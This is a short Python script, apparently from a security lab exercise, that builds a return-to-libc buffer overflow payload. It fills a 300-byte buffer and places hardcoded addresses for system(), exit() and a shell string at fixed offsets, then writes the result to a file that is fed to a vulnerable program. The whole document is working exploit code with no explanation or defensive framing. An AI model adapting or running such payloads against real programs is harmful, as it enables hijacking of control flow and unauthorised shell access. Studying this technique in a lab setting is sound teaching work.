#!/usr/bin/python3
import sys


content = bytearray(0xaa for i in range(300))

shell_addr = 0xbffffe1e     
content[120:124] = (shell_addr).to_bytes(4,byteorder='little')

exit_addr = 0xb7e369d0     
content[116:120] = (exit_addr).to_bytes(4,byteorder='little')

system_addr = 0xb7e42da0    
content[112:116] = (system_addr).to_bytes(4,byteorder='little')

# Save content to a file
with open("newfile", "wb") as f:
	f.write(content)